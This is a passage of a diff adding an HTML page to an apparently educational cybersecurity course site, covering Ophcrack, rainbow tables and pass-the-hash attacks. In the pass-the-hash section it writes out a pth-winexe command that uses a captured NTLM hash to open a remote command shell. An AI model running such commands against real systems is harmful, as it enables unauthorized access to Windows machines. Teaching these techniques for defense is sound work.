+                        <h4 style="color: var(--text-primary); margin: 1rem 0 0.5rem;">Use Cases:</h4>
+                        <ul style="color: var(--text-secondary);">
+                            <li>Password recovery from Windows SAM database</li>
+                            <li>LM/NTLM hash cracking via rainbow tables</li>
+                            <li>Password auditing for compliance assessments</li>
+                        </ul>
+                        <span class="tool-badge">Ophcrack</span>
+                    </div>
+
+                    <div class="glass-card" style="padding: 2rem;">
+                        <h3 style="color: var(--cyan); margin-bottom: 1rem;">Rainbow Tables - Precomputed Hash Chains</h3>
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            Rainbow tables are precomputed chains of password hashes that trade storage space for computation time. Instead of computing hashes in real-time during cracking, the attacker looks up the target hash in the table to find the original password.
+                        </p>
+                        <div class="tech-spec">
+                            <h4>Rainbow Table Trade-offs</h4>
+                            <p>• <strong>Time-memory trade-off:</strong> Large storage requirements (GBs-TBs) but near-instant lookup</p>
+                            <p>• <strong>Salting defeats rainbow tables:</strong> Unique salt per password requires separate tables</p>
+                            <p>• <strong>Character set coverage:</strong> Tables must match target password complexity</p>
+                        </div>
+                        <span class="tool-badge">Rainbow Tables</span>
+                    </div>
+                </section>
+
+                <!-- Pass-the-Hash -->
+                <section class="tool-category">
+                    <h2>🔑 Pass-the-Hash Attacks</h2>
+                    <div class="glass-card" style="padding: 2rem;">
+                        <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                            Pass-the-hash is a technique where an attacker captures the NTLM hash of a user's password and uses it to authenticate to other systems without ever knowing the plaintext password. This exploits the fact that Windows authentication can use hashes directly.
+                        </p>
+                        <div class="code-block">
+<span class="command">pth-winexe -U 'domain/admin%aad3b435b51404eeaad3b435b51404ee:HASH' //TARGET cmd</span>
+<span class="comment"># Authenticate using NTLM hash without plaintext password</span>
+                        </div>
+                    </div>
+                </section>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-logo">🔒 CyberCourse</div>
+            <p>A comprehensive cybersecurity crash course for beginners.</p>
+            <div class="footer-links">
+                <a href="index.html">Home</a>
+                <a href="month1.html">Month 1</a>
+                <a href="month2.html">Month 2</a>
+                <a href="month3.html">Month 3</a>
+                <a href="tools.html">Tool Hub</a>
+            </div>
+            <p style="margin-top: 1rem; font-size: 0.85rem;">© 2024 Cybersecurity Crash Course. Built for educational purposes.</p>
+        </div>
+    </footer>
+
+    <script>
+        // Tab Switching Logic
+        function switchTab(index) {
+            // Hide all tab content
+            const tabContents = document.querySelectorAll('.tab-content');
+            tabContents.forEach(tab => tab.classList.remove('active'));
+
+            // Deactivate all tab buttons
+            const tabBtns = document.querySelectorAll('.tab-btn');
+            tabBtns.forEach(btn => btn.classList.remove('active'));
+
+            // Show selected tab content
+            tabContents[index].classList.add('active');
+
+            // Activate selected tab button
+            tabBtns[index].classList.add('active');
+
+            // Scroll to tab section
+            document.querySelector('.tab-nav').scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }
+
+        // Mobile Navigation Toggle
+        function toggleNav() {
+            const navMenu = document.getElementById('navMenu');
+            navMenu.classList.toggle('active');
+        }
+
+        // Close nav when clicking outside
+        document.addEventListener('click', function(e) {
+            const navMenu = document.getElementById('navMenu');
+            const navToggle = document.querySelector('.nav-toggle');
+            if (!navMenu.contains(e.target) && !navToggle.contains(e.target)) {
+                navMenu.classList.remove('active');
+            }
+        });
+    </script>
+</body>
+</html>
